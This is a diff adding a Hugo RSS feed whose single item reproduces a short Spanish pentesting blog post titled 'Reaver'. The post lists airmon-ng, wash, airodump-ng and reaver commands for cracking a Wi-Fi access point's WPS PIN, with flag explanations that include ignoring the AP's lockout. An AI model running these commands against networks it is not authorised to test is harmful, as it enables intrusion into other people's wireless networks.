@@ -1,0 +1,42 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>reaver on #&gt; fireroot</title>
+        <link>https://www.procamora.com/tags/reaver/</link>
+        <description>Recent content in reaver on #&gt; fireroot</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>es</language>
+        <lastBuildDate>Thu, 03 Sep 2015 00:00:00 +0000</lastBuildDate><atom:link href="https://www.procamora.com/tags/reaver/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Reaver</title>
+        <link>https://www.procamora.com/p/reaver/</link>
+        <pubDate>Thu, 03 Sep 2015 00:00:00 +0000</pubDate>
+        
+        <guid>https://www.procamora.com/p/reaver/</guid>
+        <description>&lt;img src="https://www.procamora.com/covers/pentesting.png" alt="Featured image of post Reaver" /&gt;&lt;p&gt;&lt;code&gt;airmon-ng start wlan0&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;wash -i mon0&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;reaver -i mon0 -b 30:46:9A:7C:C4:CA -vv -c 8&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;iwconfig&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;airmon-ng start wlan0&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;airodump-ng mon0&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;reaver -i mon0 -vv -b (BSSID del target del AP ) -S -L&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-vv: para indicarle que nos muestre como va haciendo su trabajo.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-i: el interface.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-b: BSSID del target del AP.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-S: para que utilice claves pequeñas DH para mejorar la velocidad.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-L: para ignorar el estado locked que nos envía el AP.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;</description>
+        </item>
+        
+    </channel>
+</rss>
